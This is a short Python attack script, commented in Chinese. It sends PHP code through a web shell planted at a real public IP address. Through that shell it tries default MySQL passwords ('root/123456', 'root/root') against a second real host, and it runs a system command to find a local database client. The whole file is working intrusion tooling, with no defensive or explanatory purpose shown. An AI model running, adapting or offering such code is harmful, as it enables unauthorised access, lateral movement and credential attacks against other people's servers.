#!/usr/bin/env python3
"""81.70 上尝试连 124.71 MySQL - 多种方式"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=60):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

# 1. mysqli 带超时参数
code = '''
$c=@mysqli_init();
@mysqli_options($c, MYSQLI_OPT_CONNECT_TIMEOUT, 8);
$ok=@mysqli_real_connect($c,'124.71.142.158','root','123456',NULL,3306);
if($ok){print_r('OK:' . mysqli_get_server_info($c));}else{print_r('FAIL:' . mysqli_connect_error());}
'''
r = cmd(code, 60)
print("1. mysqli超时8s root/123456:", r.strip()[-100:], flush=True)

# 2. 试 root/root
code2 = '''
$c=@mysqli_init();
@mysqli_options($c, MYSQLI_OPT_CONNECT_TIMEOUT, 8);
$ok=@mysqli_real_connect($c,'124.71.142.158','root','root',NULL,3306);
if($ok){print_r('OK:' . mysqli_get_server_info($c));}else{print_r('FAIL:' . mysqli_connect_error());}
'''
r = cmd(code2, 60)
print("2. root/root:", r.strip()[-100:], flush=True)

# 3. 看 81.70 本地 mysql 客户端
r = cmd("system('where mysql');", 30)
print("3. mysql client:", r.strip()[-80:], flush=True)
